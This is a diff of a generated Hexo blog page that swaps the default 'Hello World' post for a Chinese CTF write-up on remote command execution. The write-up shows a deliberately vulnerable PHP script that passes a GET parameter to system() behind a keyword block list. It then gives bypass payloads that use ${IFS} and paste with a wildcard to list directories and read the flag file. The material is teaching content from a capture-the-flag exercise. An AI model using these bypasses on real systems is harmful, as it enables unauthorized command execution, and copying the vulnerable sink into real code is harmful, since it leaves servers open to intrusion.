@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Hello World, Rmy4x&#39;s blog">
+    <meta name="keywords" content="Rmy4x&#39;s blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Hello World | Rmy4x&#39;s blog</title>
+    <title>Rmy4x&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -266,12 +266,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Hello World</h1>
+                    <h1 class="description center-align post-title"></h1>
                 </div>
             </div>
         </div>
@@ -420,19 +420,36 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+                <h1 id="RCE大合集"><a href="#RCE大合集" class="headerlink" title="RCE大合集"></a>RCE大合集</h1><h3 id="简单绕过cat，tac命令，绕过空格"><a href="#简单绕过cat，tac命令，绕过空格" class="headerlink" title="简单绕过cat，tac命令，绕过空格"></a>简单绕过cat，tac命令，绕过空格</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$rce</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$rce</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hhhhhhacker!!!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p><strong>所被过滤的：</strong></p>
+<p><em><strong>cat、more、less、head、tac、tail、nl、od、vi、vim、sort，空格字符，分号 ，0-9，特殊字符: &#96; % &gt; &lt; ‘ “</strong></em></p>
+<p><strong>payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?rce=ls$&#123;IFS&#125;/</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?rce=paste$&#123;IFS&#125;/fla?</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+<p><em><strong>小结：</strong></em></p>
+<blockquote>
+<p>paste命令在Linux系统中主要用于将多个文件按行合并在一起。它的主要功能和用法包括:</p>
+<ol>
+<li><p>合并文件:基本用法是<code>paste file1 file2</code>,这会把file1和file2的内容合并显示,两文件相邻的行会并在一起。</p>
+</li>
+<li><p>指定分隔符:可以用<code>-d</code>参数指定合并时的分隔符,例如<code>paste -d &quot;:&quot; file1 file2</code>会使用冒号分隔。</p>
+</li>
+<li><p>串行合并: <code>-s</code>参数可以将多个文件串行合并,一个接一个,不并排显示。</p>
+</li>
+<li><p>从标准输入读取:可以用<code>-</code>参数从标准输入读取内容合并,例如<code>paste - -</code>。</p>
+</li>
+<li><p>输出到文件:可以通过重定向将合并结果输出到文件,例如<code>paste file1 file2 &gt; merged.txt</code>。</p>
+</li>
+<li><p>绕过过滤:在安全测试中,paste命令可以用来绕过对空格或分号的过滤,合并多个命令。</p>
+</li>
+</ol>
+<p>   <strong>总结:paste的用途主要是合并文本文件,指定分隔符,可以串行合并或输出到文件。也可以从标准输入读取。在安全测试中可以用来构造绕过过滤的命令。</strong></p>
+</blockquote>
 
                 
             </div>
@@ -459,7 +476,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://rmy4x.github.io/2023/10/04/hello-world/">https://rmy4x.github.io/2023/10/04/hello-world/</a>
+                    <a href="https://rmy4x.github.io/2023/10/04/RCE%E5%A4%A7%E5%90%88%E9%9B%86/">https://rmy4x.github.io/2023/10/04/RCE%E5%A4%A7%E5%90%88%E9%9B%86/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -664,18 +681,17 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/10/04/hello-world/">
+                <a href="/2023/10/05/RCE%E5%A4%A7%E5%90%88%E9%9B%86-1/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="RCE大合集">
                         
-                        <span class="card-title">Hello World</span>
+                        <span class="card-title">RCE大合集</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -685,18 +701,37 @@
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-10-04
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-10-05
+                        </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            Rmy4x
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF-rce%E5%90%88%E9%9B%86-%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/" class="post-category">
+                                    CTF rce合集 各种姿势
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
-
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/RCE/">
+                        <span class="chip bg-color">RCE</span>
+                    </a>
+                    
+                    <a href="/tags/SHCTF/">
+                        <span class="chip bg-color">SHCTF</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
@@ -707,13 +742,13 @@
                 本篇&nbsp;<i class="far fa-dot-circle"></i>
             </div>
             <div class="card">
-                <a href="/2023/10/04/hello-world/">
+                <a href="/2023/10/04/RCE%E5%A4%A7%E5%90%88%E9%9B%86/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
                         
-                        <span class="card-title">Hello World</span>
+                        <span class="card-title"></span>
                     </div>
                 </a>
                 <div class="card-content article-content">
